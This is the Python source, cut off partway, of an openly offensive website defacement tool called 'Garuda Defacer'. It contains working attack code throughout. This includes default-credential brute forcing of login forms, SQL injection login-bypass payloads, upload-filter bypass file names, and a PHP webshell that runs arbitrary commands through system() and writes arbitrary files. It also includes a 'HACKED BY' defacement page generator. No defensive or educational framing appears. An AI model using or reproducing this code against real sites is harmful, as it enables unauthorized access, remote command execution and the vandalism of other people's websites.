#!/usr/bin/env python3
"""
GARUDA DEFACER - Website Defacement Tool
Termux Compatible | Python 3.8+
"""

import os
import sys
import time
import random
import string
import socket
import subprocess
import platform
import hashlib
import json
import re
from urllib.parse import urljoin, urlparse

try:
    import requests
    from bs4 import BeautifulSoup
except ImportError:
    print("\n  [!] Missing dependencies. Run:")
    print("      pip install -r requirements.txt")
    print("      OR")
    print("      pip install requests beautifulsoup4")
    sys.exit(1)

# ============================================================
# CONFIGURATION
# ============================================================

VERSION = "2.0.0"
AUTHOR = "Garuda Security"

BANNER = r"""
    ██████╗ ███████╗██╗███╗   ██╗ ██████╗ ███████╗██████╗ 
   ██╔════╝ ██╔════╝██║████╗  ██║██╔═══██╗██╔════╝██╔══██╗
   ██║  ███╗█████╗  ██║██╔██╗ ██║██║   ██║█████╗  ██████╔╝
   ██║   ██║██╔══╝  ██║██║╚██╗██║██║   ██║██╔══╝  ██╔══██╗
   ╚██████╔╝██║     ██║██║ ╚████║╚██████╔╝███████╗██║  ██║
    ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝
              [ G A R U D A   D E F A C E R   v{} ]                  
                     Indonesia Black Hat                     
""".format(VERSION)

# Default credentials for brute force
DEFAULT_CREDS = [
    ("admin", "admin"), ("admin", "password"), ("admin", "123456"),
    ("admin", "admin123"), ("admin", "pass123"), ("admin", "qwerty"),
    ("admin", "letmein"), ("admin", "welcome"), ("admin", ""),
    ("admin", "Password1"), ("admin", "P@ssw0rd"), ("admin", "changeme"),
    ("root", "root"), ("root", "toor"), ("root", "password"),
    ("root", "123456"), ("administrator", "administrator"),
    ("administrator", "password"), ("admin", "admin@123"),
    ("admin", "12345"), ("admin", "1234"), ("admin", "pass"),
    ("user", "user"), ("test", "test"), ("guest", "guest"),
    ("admin", "root"), ("admin", "toor"), ("admin", "123"),
    ("admin", "password123"), ("admin", "admin1234"),
]

# SQL Injection payloads
SQLI_PAYLOADS = [
    "' OR '1'='1' --",
    "' OR '1'='1' /*",
    "' OR '1'='1' #",
    "admin'--",
    "admin' --",
    "' OR 1=1 -- -",
    "' OR 1=1 #",
    "' OR '1'='1",
    "\" OR \"1\"=\"1\" --",
    "\" OR \"1\"=\"1\" #",
    "' UNION SELECT NULL, NULL, NULL --",
    "' UNION SELECT 1, 'admin', 'password' --",
    "' OR ''=''",
    "' OR 1=1 LIMIT 1 --",
    "admin' OR '1'='1' --",
]

# Upload bypass extensions
UPLOAD_BYPASS = [
    ("index.php", "application/x-php"),
    ("index.php.jpg", "image/jpeg"),
    ("index.phtml", "application/x-php"),
    ("index.php5", "application/x-php"),
    ("index.pht", "application/x-php"),
    ("index.phar", "application/octet-stream"),
    ("index.shtml", "text/html"),
    ("index.php.png", "image/png"),
    (".htaccess", "text/plain"),
    ("index.pHp", "application/x-php"),
]

# Common admin paths
ADMIN_PATHS = [
    "/admin", "/admin/login", "/admin/index.php", "/admin/index.html",
    "/administrator", "/administrator/index.php",
    "/login", "/login.php", "/login.html",
    "/wp-login.php", "/wp-admin/",
    "/admin.php", "/panel", "/panel/login",
    "/dashboard", "/dashboard/login",
    "/cpanel", "/manage", "/backend",
    "/admin1", "/admin2", "/adminarea",
    "/adminpanel", "/admin_area",
    "/secretadmin", "/webadmin",
    "/admins", "/admin_login",
    "/moderator", "/moderator/login",
    "/control", "/controlpanel",
    "/manager", "/manager/login",
    "/staff", "/staff/login",
    "/account/login", "/user/login",
    "/members/login", "/secure/login",
]

# Upload paths
UPLOAD_PATHS = [
    "/upload", "/uploads", "/admin/upload", "/admin/uploads",
    "/admin/media", "/admin/files", "/admin/images",
    "/wp-admin/upload.php", "/wp-content/uploads",
    "/media/upload", "/file/upload", "/files/upload",
    "/panel/upload", "/dashboard/upload",
    "/admin.php?action=upload", "/upload.php", "/uploadfile",
    "/admin/upload.php", "/admin/media.php",
    "/api/upload", "/api/files",
]

# CMS fingerprints
CMS_FINGERPRINTS = {
    "WordPress": ["/wp-admin/", "/wp-login.php", "/wp-content/", "/wp-includes/"],
    "Joomla": ["/administrator/", "/components/com_", "/media/system/js/"],
    "Drupal": ["/user/login", "/sites/default/", "/misc/drupal.js"],
    "Django": ["/admin/", "/static/admin/", "/accounts/login/"],
    "Grav": ["/admin/", "/user/plugins/"],
    "OpenCart": ["/admin/", "/catalog/view/", "/system/library/"],
    "Magento": ["/admin/", "/skin/frontend/", "/js/mage/"],
    "PrestaShop": ["/admin/", "/modules/", "/themes/"],
    "Laravel": ["/login", "/register", "/_debugbar"],
    "CodeIgniter": ["/index.php/login", "/application/"],
}

# Common index files to overwrite
INDEX_FILES = [
    "index.html", "index.php", "index.htm",
    "default.html", "default.php", "default.htm",
    "home.html", "home.php", "home.htm",
    "main.html", "main.php",
    "welcome.html", "welcome.php",
]

# Web roots
WEB_ROOTS = [
    ".", "/var/www/html", "/var/www", "/usr/share/nginx/html",
    "/home/USERNAME/public_html", "/var/www/html/public_html",
    "/htdocs", "/public_html", "/www", "/web",
    "/var/www/htdocs", "/srv/www", "/srv/http",
    "/var/www/vhosts", "/opt/lampp/htdocs",
]

# ============================================================
# TERMUX DETECTION
# ============================================================

def is_termux():
    """Detect if running on Termux"""
    return "com.termux" in os.environ.get("PREFIX", "") or \
           os.path.exists("/data/data/com.termux") or \
           "termux" in os.environ.get("HOME", "").lower()

def open_file(file_path):
    """Open file cross-platform including Termux"""
    try:
        if is_termux():
            os.system(f"termux-open '{file_path}' 2>/dev/null")
        elif os.name == "nt":
            os.startfile(file_path)
        elif sys.platform == "darwin":
            subprocess.Popen(["open", file_path])
        else:
            subprocess.Popen(["xdg-open", file_path])
    except:
        pass

def check_termux_deps():
    """Check and install Termux dependencies"""
    if not is_termux():
        return
    
    print("  [*] Termux detected. Checking dependencies...")
    
    # Check if python is available
    try:
        subprocess.run(["python", "--version"], capture_output=True, check=True)
    except:
        print("  [!] Python not properly configured")
    
    # Check termux-api for termux-open
    result = subprocess.run(["which", "termux-open"], capture_output=True, text=True)
    if result.returncode != 0:
        print("  [!] termux-api not found. Installing...")
        print("  [*] Run: pkg install termux-api")
        print("  [*] Also install Termux:API app from F-Droid")
    
    # Check storage permission
    if not os.path.exists(os.path.expanduser("~/storage")):
        print("  [*] Setting up storage access...")
        os.system("termux-setup-storage 2>/dev/null")
        time.sleep(2)

# ============================================================
# UTILITY FUNCTIONS
# ============================================================

def clear_screen():
    os.system("cls" if os.name == "nt" else "clear")

def slow_print(text, speed=0.01):
    for char in text:
        print(char, end="", flush=True)
        time.sleep(speed)
    print()

def print_status(symbol, message, color=""):
    colors = {
        "red": "\033[91m",
        "green": "\033[92m",
        "yellow": "\033[93m",
        "blue": "\033[94m",
        "purple": "\033[95m",
        "cyan": "\033[96m",
        "white": "\033[97m",
        "reset": "\033[0m",
    }
    c = colors.get(color, "")
    r = colors["reset"]
    print(f"  {c}[{symbol}]{r} {message}")

def print_banner():
    """Print banner with color"""
    red = "\033[91m"
    white = "\033[97m"
    reset = "\033[0m"
    print(red + BANNER + reset)
    print(white + "  " + "=" * 58 + reset)
    print(f"  |  Website Defacement Tool v{VERSION} - {AUTHOR}  |")
    print(f"  |  Termux Compatible | Python {platform.python_version()}{' ' * (16 - len(platform.python_version()))}  |")
    print(white + "  " + "=" * 58 + reset)
    print()

def get_random_ua():
    """Random User-Agent"""
    uas = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(uas)

def get_headers(url=None):
    """Get request headers"""
    headers = {
        "User-Agent": get_random_ua(),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Connection": "keep-alive",
    }
    if url:
        headers["Referer"] = url
    return headers

# ============================================================
# DEFACE PAGE GENERATOR
# ============================================================

def generate_deface_page(image_url, message, alias, group_name="Garuda Security"):
    """Generate defacement HTML page"""
    page_id = ''.join(random.choices(string.ascii_letters + string.digits, k=20))
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    html = f"""<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Hacked by {alias}</title>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Share+Tech+Mono&family=Iceland&display=swap" rel="stylesheet">
<style>
  * {{ margin: 0; padding: 0; box-sizing: border-box; }}
  
  body {{
    background: #000;
    color: #e0e0e0;
    font-family: 'Share Tech Mono', monospace;
    overflow-x: hidden;
    min-height: 100vh;
    display: flex;
    flex-direction: column;
    align-items: center;
    justify-content: center;
  }}

  /* Matrix rain canvas */
  #matrix {{
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    z-index: 0;
    opacity: 0.12;
  }}

  /* Scanline overlay */
  .scanline {{
    position: fixed;
    top: 0; left: 0;
    width: 100%; height: 100%;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(255, 0, 0, 0.03) 2px,
      rgba(255, 0, 0, 0.03) 4px
    );
    pointer-events: none;
    z-index: 9999;
    animation: scanmove 0.1s linear infinite;
  }}
  
  @keyframes scanmove {{
    from {{ transform: translateY(0); }}
    to {{ transform: translateY(4px); }}
  }}

  .container {{
    position: relative;
    z-index: 10;
    text-align: center;
    padding: 30px 20px;
    max-width: 900px;
    width: 100%;
  }}

  /* Garuda emblem */
  .garuda-emblem {{
    width: 180px;
    height: 180px;
    margin: 0 auto 25px;
    position: relative;
  }}

  .garuda-emblem img {{
    width: 100%;
    height: 100%;
    object-fit: contain;
    filter: drop-shadow(0 0 15px rgba(255,0,0,0.7))
            drop-shadow(0 0 30px rgba(255,0,0,0.3))
            brightness(1.1) contrast(1.1);
    animation: garuda-pulse 3s ease-in-out infinite;
  }}

  @keyframes garuda-pulse {{
    0%, 100% {{ filter: drop-shadow(0 0 15px rgba(255,0,0,0.7)) drop-shadow(0 0 30px rgba(255,0,0,0.3)) brightness(1.1) contrast(1.1); transform: scale(1); }}
    50% {{ filter: drop-shadow(0 0 25px rgba(255,0,0,1)) drop-shadow(0 0 50px rgba(255,0,0,0.5)) brightness(1.2) contrast(1.2); transform: scale(1.03); }}
  }}

  .garuda-ring {{
    position: absolute;
    top: -15px; left: -15px;
    right: -15px; bottom: -15px;
    border: 2px solid rgba(255, 0, 0, 0.4);
    border-radius: 50%;
    animation: ring-rotate 10s linear infinite;
  }}

  .garuda-ring::before {{
    content: '';
    position: absolute;
    top: -8px; left: 50%;
    width: 16px; height: 16px;
    background: #ff0000;
    border-radius: 50%;
    transform: translateX(-50%);
    box-shadow: 0 0 15px #ff0000;
  }}

  .garuda-ring2 {{
    position: absolute;
    top: -8px; left: -8px;
    right: -8px; bottom: -8px;
    border: 1px dashed rgba(255, 255, 255, 0.3);
    border-radius: 50%;
    animation: ring-rotate 7s linear infinite reverse;
  }}

  @keyframes ring-rotate {{
    from {{ transform: rotate(0deg); }}
    to {{ transform: rotate(360deg); }}
  }}

  /* Glitch title */
  h1 {{
    font-family: 'Orbitron', sans-serif;
    font-size: 3rem;
    font-weight: 900;
    color: #ff0000;
    text-shadow: 
      0 0 10px #ff0000, 
      0 0 20px #ff0000, 
      0 0 40px #ff0000,
      2px 0 #00ff00,
      -2px 0 #0000ff;
    letter-spacing: 6px;
    margin-bottom: 8px;
    animation: glitch-anim 0.5s infinite;
    position: relative;
  }}

  @keyframes glitch-anim {{
    0% {{ text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, 2px 0 #00ff00, -2px 0 #0000ff; }}
    25% {{ text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, -2px 0 #00ff00, 2px 0 #0000ff; }}
    50% {{ text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, 1px 0 #00ff00, -1px 0 #0000ff; }}
    75% {{ text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, -1px 0 #00ff00, 1px 0 #0000ff; }}
    100% {{ text-shadow: 0 0 10px #ff0000, 0 0 20px #ff0000, 0 0 40px #ff0000, 2px 0 #00ff00, -2px 0 #0000ff; }}
  }}

  .subtitle {{
    font-family: 'Orbitron', sans-serif;
    font-size: 1rem;
    color: #ffffff;
    letter-spacing: 10px;
    margin-bottom: 30px;
    text-transform: uppercase;
    text-shadow: 0 0 10px rgba(255,255,255,0.5);
  }}

  .loading-bar {{
    width: 280px;
    height: 3px;
    background: rgba(255, 0, 0, 0.15);
    margin: 0 auto 25px;
    overflow: hidden;
    border-radius: 2px;
    position: relative;
  }}

  .loading-bar::after {{
    content: '';
    display: block;
    width: 30%;
    height: 100%;
    background: linear-gradient(90deg, transparent, #ff0000, transparent);
    animation: loading-slide 1.5s ease-in-out infinite;
  }}

  @keyframes loading-slide {{
    0% {{ transform: translateX(-100%); }}
    100% {{ transform: translateX(400%); }}
  }}

  /* Message box */
  .message-box {{
    background: rgba(15, 0, 0, 0.85);
    border: 1px solid #ff0000;
    border-radius: 6px;
    padding: 25px 35px;
    margin: 15px auto;
    max-width: 650px;
    box-shadow: 
      0 0 30px rgba(255, 0, 0, 0.25),
      inset 0 0 15px rgba(255, 0, 0, 0.08);
    position: relative;
  }}

  .message-box::before {{
    content: '> MESSAGE';
    position: absolute;
    top: -11px;
    left: 25px;
    background: #000;
    color: #ff0000;
    padding: 0 12px;
    font-size: 0.75rem;
    letter-spacing: 3px;
    font-family: 'Orbitron', sans-serif;
    font-weight: 700;
  }}

  .message-box::after {{
    content: 'ID: {page_id}';
    position: absolute;
    bottom: -11px;
    right: 25px;
    background: #000;
    color: #444;
    padding: 0 12px;
    font-size: 0.65rem;
    letter-spacing: 1px;
  }}

  .message {{
    color: #e8e8e8;
    font-size: 1.05rem;
    line-height: 1.9;
    white-space: pre-wrap;
    text-align: center;
  }}

  /* Image display */
  .image-display {{
    max-width: 450px;
    width: 90%;
    margin: 25px auto;
    border: 2px solid #ff0000;
    border-radius: 4px;
    overflow: hidden;
    box-shadow: 0 0 35px rgba(255, 0, 0, 0.3);
    position: relative;
  }}

  .image-display img {{
    width: 100%;
    display: block;
    filter: contrast(1.15) saturate(1.3) brightness(0.95);
    transition: filter 0.3s;
  }}

  .image-display:hover img {{
    filter: contrast(1.3) saturate(1.5) brightness(1.05);
  }}

  .image-display::after {{
    content: '';
    position: absolute;
    top: 0; left: 0; right: 0; bottom: 0;
    background: linear-gradient(transparent 50%, rgba(255, 0, 0, 0.03) 50%);
    background-size: 100% 3px;
    pointer-events: none;
  }}

  /* Footer */
  .footer {{
    margin-top: 40px;
    color: #555;
    font-size: 0.85rem;
    line-height: 1.6;
  }}

  .footer .alias {{
    color: #ff0000;
    font-family: 'Orbitron', sans-serif;
    font-weight: 700;
    letter-spacing: 3px;
    font-size: 1rem;
    margin: 5px 0;
  }}

  .footer .group {{
    color: #888;
    font-family: 'Iceland', cursive;
    font-size: 1.3rem;
    letter-spacing: 2px;
  }}

  .footer .date {{
    color: #333;
    font-size: 0.75rem;
    margin-top: 5px;
  }}

  /* Corner decorations */
  .corner {{
    position: fixed;
    width: 40px;
    height: 40px;
    border-color: rgba(255, 0, 0, 0.5);
    z-index: 100;
  }}

  .corner-tl {{ top: 15px; left: 15px; border-top: 2px solid; border-left: 2px solid; }}
  .corner-tr {{ top: 15px; right: 15px; border-top: 2px solid; border-right: 2px solid; }}
  .corner-bl {{ bottom: 15px; left: 15px; border-bottom: 2px solid; border-left: 2px solid; }}
  .corner-br {{ bottom: 15px; right: 15px; border-bottom: 2px solid; border-right: 2px solid; }}

  /* Typing cursor */
  .cursor {{
    display: inline-block;
    width: 10px;
    height: 1.1em;
    background: #ff0000;
    animation: blink 1s infinite;
    vertical-align: text-bottom;
    margin-left: 3px;
  }}

  @keyframes blink {{
    0%, 49% {{ opacity: 1; }}
    50%, 100% {{ opacity: 0; }}
  }}

  @media (max-width: 600px) {{
    h1 {{ font-size: 2rem; letter-spacing: 4px; }}
    .subtitle {{ font-size: 0.8rem; letter-spacing: 5px; }}
    .garuda-emblem {{ width: 130px; height: 130px; }}
    .message {{ font-size: 0.9rem; }}
    .image-display {{ max-width: 300px; }}
  }}
</style>
</head>
<body>

<canvas id="matrix"></canvas>
<div class="scanline"></div>
<div class="corner corner-tl"></div>
<div class="corner corner-tr"></div>
<div class="corner corner-bl"></div>
<div class="corner corner-br"></div>

<div class="container">
  <div class="garuda-emblem">
    <div class="garuda-ring"></div>
    <div class="garuda-ring2"></div>
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/9/90/National_Emblem_of_Indonesia_Garuda_Pancasila.svg/1200px-National_Emblem_of_Indonesia_Garuda_Pancasila.svg.png" 
         alt="Garuda Pancasila" 
         onerror="this.src='https://raw.githubusercontent.com/imohuan/garuda-defacer/main/assets/garuda.png';this.onerror=null;">
  </div>

  <h1>HACKED</h1>
  <div class="subtitle">By {alias}</div>

  <div class="loading-bar"></div>

  <div class="message-box">
    <div class="message">{message}<span class="cursor"></span></div>
  </div>
"""

    if image_url and image_url.strip():
        html += f"""
  <div class="image-display">
    <img src="{image_url}" alt="Hacked Image" onerror="this.style.display='none'">
  </div>
"""

    html += f"""
  <div class="footer">
    <div class="group">{group_name}</div>
    <div class="alias">[ {alias} ]</div>
    <div class="date">System Compromised &middot; {timestamp}</div>
    <div class="date" style="margin-top: 3px;">Indonesia &copy; {time.strftime('%Y')}</div>
  </div>
</div>

<script>
  // Matrix rain
  const canvas = document.getElementById('matrix');
  const ctx = canvas.getContext('2d');
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
  
  const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%&*ガルダパンチャシラ';
  const fontSize = 14;
  const columns = Math.floor(canvas.width / fontSize);
  let drops = Array(columns).fill(1);

  function drawMatrix() {{
    ctx.fillStyle = 'rgba(0, 0, 0, 0.04)';
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = '#ff0000';
    ctx.font = fontSize + 'px monospace';
    
    for (let i = 0; i < drops.length; i++) {{
      const text = chars[Math.floor(Math.random() * chars.length)];
      ctx.fillText(text, i * fontSize, drops[i] * fontSize);
      if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {{
        drops[i] = 0;
      }}
      drops[i]++;
    }}
  }}
  setInterval(drawMatrix, 50);
  
  window.addEventListener('resize', () => {{
    canvas.width = window.innerWidth;
    canvas.height = window.innerHeight;
  }});

  // Disable right click
  document.addEventListener('contextmenu', e => e.preventDefault());

  // Dynamic title
  const titles = ['HACKED', 'OWNED', 'PWNED', '{alias}', 'GARUDA'];
  let ti = 0;
  setInterval(() => {{
    document.title = titles[ti % titles.length] + ' by {alias}';
    ti++;
  }}, 2000);

  // Console message
  console.log('%cHACKED BY {alias}', 'color: red; font-size: 40px; font-weight: bold;');
  console.log('%cGaruda Security - Indonesia', 'color: white; font-size: 20px;');
  console.log('%cWe do not forgive. We do not forget. Expect us.', 'color: red; font-size: 14px;');
</script>

</body>
</html>"""

    return html

# ============================================================
# RECON MODULE
# ============================================================

def recon_target(url):
    """Perform reconnaissance on target"""
    results = {
        "url": url,
        "status": None,
        "server": None,
        "title": None,
        "cms": [],
        "tech": [],
        "login_forms": [],
        "upload_forms": [],
        "robots": None,
        "ip": None,
    }
    
    headers = get_headers()
    
    # Resolve IP
    try:
        parsed = urlparse(url)
        domain = parsed.netloc.split(":")[0]
        results["ip"] = socket.gethostbyname(domain)
    except:
        pass
    
    # Basic request
    try:
        r = requests.get(url, headers=headers, timeout=15, allow_redirects=True)
        results["status"] = r.status_code
        results["server"] = r.headers.get("Server", "Unknown")
        results["title"] = extract_title(r.text)
        
        # Detect technologies from headers
        powered_by = r.headers.get("X-Powered-By", "")
        if powered_by:
            results["tech"].append(powered_by)
        
        if "PHP" in r.text or "php" in powered_by.lower():
            results["tech"].append("PHP")
        if "ASP.NET" in r.text or "asp.net" in powered_by.lower():
            results["tech"].append("ASP.NET")
            
    except requests.exceptions.Timeout:
        print_status("!", "Connection timed out", "yellow")
        return results
    except requests.exceptions.ConnectionError:
        print_status("!", "Failed to connect to target", "red")
        return results
    except Exception as e:
        print_status("!", f"Error: {e}", "red")
        return results
    
    # Check robots.txt
    try:
        robots_url = urljoin(url, "/robots.txt")
        r_robots = requests.get(robots_url, headers=headers, timeout=8)
        if r_robots.status_code == 200:
            results["robots"] = r_robots.text[:500]
            print_status("+", "robots.txt found", "green")
    except:
        pass
    
    # Detect CMS
    print_status("*", "Detecting CMS/platform...", "blue")
    for cms, paths in CMS_FINGERPRINTS.items():
        for path in paths:
            try:
                r = requests.get(urljoin(url, path), headers=headers, timeout=8, allow_redirects=True)
                if r.status_code == 200 and len(r.text) > 200:
                    results["cms"].append(cms)
                    print_status("+", f"CMS Detected: {cms}", "green")
                    break
            except:
                continue
    
    if not results["cms"]:
        # Check meta tags and generators
        try:
            r = requests.get(url, headers=headers, timeout=10)
            soup = BeautifulSoup(r.text, "html.parser")
            generator = soup.find("meta", {"name": "generator"})
            if generator:
                gen_content = generator.get("content", "")
                if "WordPress" in gen_content:
                    results["cms"].append("WordPress")
                    print_status("+", f"CMS Detected: WordPress ({gen_content})", "green")
                elif "Joomla" in gen_content:
                    results["cms"].append("Joomla")
                    print_status("+", f"CMS Detected: Joomla ({gen_content})", "green")
                elif "Drupal" in gen_content:
                    results["cms"].append("Drupal")
                    print_status("+", f"CMS Detected: Drupal ({gen_content})", "green")
        except:
            pass
    
    if not results["cms"]:
        print_status("-", "No known CMS detected", "yellow")
    
    return results

def extract_title(html):
    """Extract page title"""
    match = re.search(r"<title[^>]*>(.*?)</title>", html, re.IGNORECASE | re.DOTALL)
    return match.group(1).strip() if match else "Unknown"

# ============================================================
# LOGIN FORM DISCOVERY
# ============================================================

def find_login_forms(url):
    """Discover login forms on target"""
    headers = get_headers(url)
    forms = []
    seen_actions = set()
    
    # Check main page
    try:
        r = requests.get(url, headers=headers, timeout=12)
        forms.extend(parse_login_forms(r.text, url, url))
    except:
        pass
    
    # Check common admin paths
    for path in ADMIN_PATHS:
        try:
            full_url = urljoin(url, path)
            r = requests.get(full_url, headers=headers, timeout=8, allow_redirects=True)
            if r.status_code == 200 and ("password" in r.text.lower() or "passwd" in r.text.lower()):
                new_forms = parse_login_forms(r.text, full_url, url)
                for form in new_forms:
                    if form["action"] not in seen_actions:
                        form["discovered_at"] = path
                        forms.append(form)
                        seen_actions.add(form["action"])
        except:
            continue
    
    return forms

def parse_login_forms(html, page_url, referer):
    """Parse HTML for login forms"""
    forms = []
    seen = set()
    
    try:
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            inputs = form.find_all("input")
            has_password = any(inp.get("type", "").lower() == "password" for inp in inputs)
            if not has_password:
                continue
            
            action = form.get("action", "")
            if not action:
                action = page_url
            elif not action.startswith("http"):
                action = urljoin(page_url, action)
            
            if action in seen:
                continue
            seen.add(action)
            
            method = form.get("method", "post").lower()
            fields = {}
            for inp in inputs:
                name = inp.get("name")
                if name:
                    fields[name] = inp.get("value", "")
            
            forms.append({
                "action": action,
                "method": method,
                "fields": fields,
                "referer": referer,
            })
    except:
        pass
    
    return forms

# ============================================================
# CREDENTIAL BRUTE FORCE
# ============================================================

def identify_fields(fields):
    """Identify username and password fields"""
    user_field = None
    pass_field = None
    
    for name in fields:
        lower = name.lower()
        if any(x in lower for x in ["pass", "pwd", "password", "passwd"]):
            pass_field = name
        elif any(x in lower for x in ["user", "email", "login", "name", "account", "mail"]):
            user_field = name
    
    # Fallback: first empty field is username, second is password
    if not user_field or not pass_field:
        empty_fields = [n for n, v in fields.items() if not v]
        if not user_field and empty_fields:
            user_field = empty_fields[0]
        if not pass_field and len(empty_fields) > 1:
            pass_field = empty_fields[1]
    
    # Last resort: any field with type
    if not pass_field:
        for name in fields:
            if name != user_field:
                pass_field = name
                break
    
    return user_field, pass_field

def try_credentials(form, url):
    """Brute force with default credentials"""
    headers = get_headers(url)
    user_field, pass_field = identify_fields(form["fields"])
    
    if not user_field or not pass_field:
        return False, None
    
    total = len(DEFAULT_CREDS)
    
    for i, (username, password) in enumerate(DEFAULT_CREDS):
        data = dict(form["fields"])
        data[user_field] = username
        data[pass_field] = password
        
        # Add common hidden fields
        for key in data:
            if data[key] == "" and key != user_field and key != pass_field:
                data[key] = "1"
        
        try:
            if form["method"] == "post":
                r = requests.post(form["action"], data=data, headers=headers, timeout=12, allow_redirects=False)
            else:
                r = requests.get(form["action"], params=data, headers=headers, timeout=12, allow_redirects=False)
            
            if is_login_successful(r):
                return True, (username, password)
                
        except requests.exceptions.Timeout:
            continue
        except:
            continue
    
    return False, None

def is_login_successful(r):
    """Check if login was successful"""
    # Check redirect
    if r.status_code in [301, 302, 303]:
        location = r.headers.get("Location", "").lower()
        good_indicators = ["dashboard", "admin", "panel", "home", "welcome", "index", "main", "overview", "control"]
        bad_indicators = ["login", "error", "invalid", "wrong", "denied", "failed", "incorrect"]
        
        if any(x in location for x in good_indicators) and not any(x in location for x in bad_indicators):
            return True
    
    if r.status_code == 200:
        text_lower = r.text.lower()
        good_indicators = ["logout", "log out", "sign out", "dashboard", "welcome", "my account", "profile", "settings", "administration"]
        bad_indicators = ["invalid", "error", "incorrect", "wrong", "denied", "failed", "captcha", "locked", "try again", "access denied"]
        
        if any(x in text_lower for x in good_indicators) and not any(x in text_lower for x in bad_indicators):
            return True
    
    return False

# ============================================================
# SQL INJECTION
# ============================================================

def try_sqli(form, url):
    """Attempt SQL injection on login form"""
    headers = get_headers(url)
    user_field, pass_field = identify_fields(form["fields"])
    
    if not user_field or not pass_field:
        return False
    
    for payload in SQLI_PAYLOADS:
        data = dict(form["fields"])
        data[user_field] = payload
        data[pass_field] = "anything"
        
        try:
            if form["method"] == "post":
                r = requests.post(form["action"], data=data, headers=headers, timeout=12, allow_redirects=False)
            else:
                r = requests.get(form["action"], params=data, headers=headers, timeout=12, allow_redirects=False)
            
            if is_login_successful(r):
                return True
        except:
            continue
    
    return False

# ============================================================
# FILE UPLOAD DISCOVERY
# ============================================================

def find_upload_forms(url):
    """Find file upload forms"""
    headers = get_headers(url)
    forms = []
    seen = set()
    
    # Check main page
    try:
        r = requests.get(url, headers=headers, timeout=12)
        forms.extend(parse_upload_forms(r.text, url, url))
    except:
        pass
    
    # Check common upload paths
    for path in UPLOAD_PATHS:
        try:
            full_url = urljoin(url, path)
            r = requests.get(full_url, headers=headers, timeout=8, allow_redirects=True)
            if r.status_code == 200 and ("file" in r.text.lower() or "upload" in r.text.lower()):
                new_forms = parse_upload_forms(r.text, full_url, url)
                for form in new_forms:
                    if form["action"] not in seen:
                        form["discovered_at"] = path
                        forms.append(form)
                        seen.add(form["action"])
        except:
            continue
    
    return forms

def parse_upload_forms(html, page_url, referer):
    """Parse HTML for upload forms"""
    forms = []
    
    try:
        soup = BeautifulSoup(html, "html.parser")
        for form in soup.find_all("form"):
            if form.find("input", {"type": "file"}):
                action = form.get("action", "")
                if not action:
                    action = page_url
                elif not action.startswith("http"):
                    action = urljoin(page_url, action)
                
                method = form.get("method", "post").lower()
                fields = {}
                for inp in form.find_all("input"):
                    name = inp.get("name")
                    if name:
                        fields[name] = inp.get("value", "")
                
                # Find file input name
                file_input = form.find("input", {"type": "file"})
                file_field = file_input.get("name", "file") if file_input else "file"
                
                forms.append({
                    "action": action,
                    "method": method,
                    "fields": fields,
                    "file_field": file_field,
                    "referer": referer,
                })
    except:
        pass
    
    return forms

# ============================================================
# SHELL UPLOAD
# ============================================================

def generate_webshell():
    """Generate PHP webshell"""
    return """<?php
@error_reporting(0);
@ini_set('display_errors', 0);

if(isset($_REQUEST['cmd'])){
    $cmd = $_REQUEST['cmd'];
    echo "<pre>";
    system($cmd);
    echo "</pre>";
    die();
}

if(isset($_POST['write']) && isset($_POST['file']) && isset($_POST['content'])){
    $file = $_POST['file'];
    $content = base64_decode($_POST['content']);
    if(file_put_contents($file, $content)){
        echo "OK: Written to $file (" . strlen($content) . " bytes)";
    } else {
        echo "FAIL: Could not write to $file";
    }
    die();
}

if(isset($_POST['findroot'])){
    $paths = array('.', '/var/www/html', '/var/www', '/usr/share/nginx/html', '/htdocs', '/public_html', '/www', '/srv/www', '/srv/http', '/var/www/htdocs', '/opt/lampp/htdocs');
    foreach($paths as $p){
        if(is_dir($p) && is_writable($p)){
            echo $p . "\\n";
        }
    }
    // Also check where the shell itself is
    echo "SHELLDIR:" . dirname(__FILE__) . "\\n";
    die();
}

if(isset($_GET['list'])){
    $dir = $_GET['list'];
    if(is_dir($dir)){
        $files = scandir($dir);
        foreach($files as $f){
            $full = $dir . '/' . $f;
